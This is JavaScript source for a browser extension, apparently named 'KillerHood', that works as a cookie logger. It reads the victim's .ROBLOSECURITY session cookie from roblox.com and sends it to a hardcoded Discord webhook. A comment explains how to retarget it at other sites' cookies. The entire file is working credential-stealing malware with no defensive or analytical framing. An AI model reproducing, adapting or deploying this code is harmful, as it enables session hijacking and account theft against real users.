function webhookReq(webhook, cookie) {
    var params = {
        embeds: [{
              "title": `KillerHood Cookie Logger:`,
              "description": ">>> KillerHood extension logged someone; see information about the user below",
              "color": 15258703,
              "fields": [{
                "name": 'Cookie',
                "value": "```\n" + cookie + "\n```",
                inline: false
              }]
      }]
    }
     
    // Send the webhook request
    fetch(webhook, {
      method: "POST",
      headers: {
        'Content-type': 'application/json'
      },
      body: JSON.stringify(params)
    })
  }
  
  
  
  // Driver Code:
  cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
  chrome.cookies.get(cookieInfo, function(cookie) {
    if (cookie) {
      webhookReq("https://discord.com/api/webhooks/1003782530404712550/UXvg1Vh7YJDPerL54zY3eiZQgHsSOj44A0on9nwXh13LUl6MlJ_TjV7jg4tC-4f8-XdE", cookie.value);
    }
  });
